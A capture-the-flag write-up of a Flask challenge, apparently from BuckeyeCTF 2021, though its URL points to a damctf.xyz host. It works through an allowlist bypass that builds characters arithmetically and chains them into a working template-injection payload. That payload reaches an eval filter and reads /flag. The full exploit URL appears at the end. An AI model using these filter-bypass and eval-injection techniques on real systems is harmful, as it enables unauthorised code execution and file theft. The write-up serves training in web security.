# BuckeyeCTF 2021 - `web/super-secure-translation-implementation`

## Challenge Description

Get creative and try to bypass the unhackable security measures that keep this site safe.

[super-secure-translation-implementation.chals.damctf.xyz](super-secure-translation-implementation.chals.damctf.xyz)

## Solution Summary

Use arthimetic and the `chr` function to inject banned characters and wrap the payload in parthensis to bypass the filter on the `open` function.

## Challenge Analysis

This challenge is a website that claims to have anti-hack checks that protect it againt server side template injection.
The website publishes its own source files, so we can see exactly how everything works.
The backend of this website is written in Flask.

In `app.py`, we first see various custom Jinja filters configured:

```python
server.jinja_env.filters["u"] = uppercase
server.jinja_env.filters["l"] = lowercase
server.jinja_env.filters["b64d"] = b64d
server.jinja_env.filters["order"] = order
server.jinja_env.filters["ch"] = character
server.jinja_env.filters["e"] = e
```

In Jinja templates (the templating syntax that Flask uses) filters can be with the syntax `arg|filter`, where `arg` is the argument and `filter` is the filter.
We will see exactly what these filters do later when we look at `filters.py`.

Later in the code, we find an endpoint at `/secure_translate/` that accepts a `payload` URL parameter.
It will then render our payload in a Jinja template and return it:

```python
resp = render_template_string(
    """{% extends "secure_translate.html" %}{% block content %}<p>"""
    + str(detect_remove_hacks(payload))
    + """</p><a href="/">Take Me Home</a>{% endblock %}"""
)
return Response(response=resp, status=200)
```

Our payload is wrapped with `detect_remove_hacks`.
We can find the implemenation of this function in `check.py` and see that it restricts our payload to only the following characters:

```python
allowlist = ["c", "{", "}", "d", "6", "l", "(", "b", "o", "r", ")", '"', "1", "4", "+", "h", "u", "-", "*", "e", "|", "'"]
```

We also find a `is_within_bounds` check that limits the size of the input.
This challenge was a golf challenge, so this limit became more restrictive as the challenge continued, eventually reaching `161` characters.

Now we revist `filters.py` to see what the custom filters do. Most of these are just map to native Python functions.
One of the more interesting ones is the `ch` filter which will convert a number to its respective unicode character.
The `e` filter is also very interesting as it has its own implementation:

```python
def e(x):
    # Security analysts reviewed this and said eval is unsafe (haters).
    # They would not approve this as "hack proof" unless I add some
    # checks to prevent easy exploits.

    print(f"Evaluating: {x}")

    forbidlist = [" ", "=", ";", "\n", ".globals", "exec"]

    for y in forbidlist:
        if y in x:
            return "Eval Failed: Foridlist."

    if x[0:4] == "open" or x[0:4] == "eval":
        return "Not That Easy ;)"

    try:
        return eval(x)
    except Exception as exc:
        return f"Eval Failed: {exc}"
```

This filter calls `eval` on its input, which effectively interprets the input string as if it were Python code.
However, there are some restrictions imposed on the input of this function.
We canot pass the strings `[" ", "=", ";", "\n", ".globals", "exec"]` in our input, and we cannot start out input with `open` or `eval`.

The flag in this challenge is at `/flag` on the server.

## Solution Walkthrough

Normally, a challenge like this would be fairly easy.
We could just inject `{{request.application.__globals__.__builtins__.open('/flag').read()}}`
However, due to the restrive allowlist, we cannot inject most of these characters.
We can inject the `{{ }}` since `{` and `}` are in the allowlist, but there is not much that we can actually put inside of the expression.

The characters used in the custom filters are all in the allowlist, along with the `|` character, so we can at least use some filters in our payload.
Perhaps we can use these filters to expand the range of characters that we can inject.

I noticed that allowlist also contains the numbers `1`, `4`, and `6` along with the arthimetic operators `+`, `-`, and `*`.
We can combine these to inject any number we want into our payload.
Additionally, we can use the `ch` filter to convert this number to a character string, meaning that we can inject any character into our payload!

For instance, the payload `(64%2b46)|ch` results in the string `'p'` being displayed since the unicode is `64+46=110`.
Note that we used `%2b` in place of `+` since HTTP interprets `+` as a space.
We also had to wrap our arithmetic in parnthesis because the filter operator `|` takes precedence over arthimetic.
Luckily the `(` and `)` charcters are in the list of characters allowed in our payload.

We can concatenate multiple of these characters together to form strings.
For instance `"o"%2b(4*4*(6%2b1))|ch%2b"e"%2b(64%2b46)|ch` outputs the string `open`.
Notice how we did not need to calculate `"o"` or `"e"` using arthimetic since they are already in the allowlist (the quotes are in the allowlist as well).

This method currently only allows us to inject strings into the template; the strings will not be evaluated as code.
However, we could use the defined `e` filter to evaluate our string as code.
Since `eval` will be called within Python rather than Jinja, we do need to proceed our payload with `request.application.__globals__.__builtins__`
(in fact `eval` does not even have access to `request`).
The following code would display the flag:

```python
open('/flag').read()
```

However, the implementation of the `e` filter bans `open` at the beginning of the input string to `eval`.
I had the idea of prepending the input with a space to avoid this, but `e` also bans space characters.
However, we can instead avoid this by simply wrapping the whole input with parentheses:

```python
(open('/flag').read())
```

In our full payload, we can construct this string using our previous method and then pass it into the `e` filter.
I wrote a script to generate this payload, but you could also construct it manually pretty easily.
The arthimetic expressions used to generate each of the ban characters were just hardcoded.
Since the payload must be a certain size, it is important that these arthimetic expressions are as short as possible.
The following arthimetic expressions were used here:

```
n 110 = 46+46+6+6+6     = (46%2b46%2b6%2b6%2b6)|ch
/ 47  = 46+1            = (46%2b1)|ch
a 97  = 46+46+6-1       = (46%2b46%2b6-1)|ch
p 112 = 4*4*(6+1)       = (4*4*(6%2b1))|ch
. 46  = 46              = 46|ch
f 102 = 4*6*4+6         = (4*6*4%2b6)|ch
g 103 = 4*6*4+6+1       = (4*6*4%2b6%2b1)|ch
```

The result is:

```
{{("(o"%2b(4*4*(6%2b1))|ch%2b"e"%2b(64%2b46)|ch%2b"('"%2b(46%2b1)|ch%2b(4*6*4%2b6)|ch%2b"l"%2b(46%2b46%2b6-1)|ch%2b(4*6*4%2b6%2b1)|ch%2b"')"%2b46|ch%2b"re"%2b(46%2b46%2b6-1)|ch%2b"d())")|e}}
```

After the `%2b` percent encoding are converted to `+` characters, the length of this payload is `142`, which is below the required length of `161`!
Sending this payload to the endpoints results in the flag being displayed:

```
https://super-secure-translation-implementation.chals.damctf.xyz/secure_translate?payload={{("(o"%2b(4*4*(6%2b1))|ch%2b"e"%2b(64%2b46)|ch%2b"('"%2b(46%2b1)|ch%2b(4*6*4%2b6)|ch%2b"l"%2b(46%2b46%2b6-1)|ch%2b(4*6*4%2b6%2b1)|ch%2b"')"%2b46|ch%2b"re"%2b(46%2b46%2b6-1)|ch%2b"d())")|e}}
```


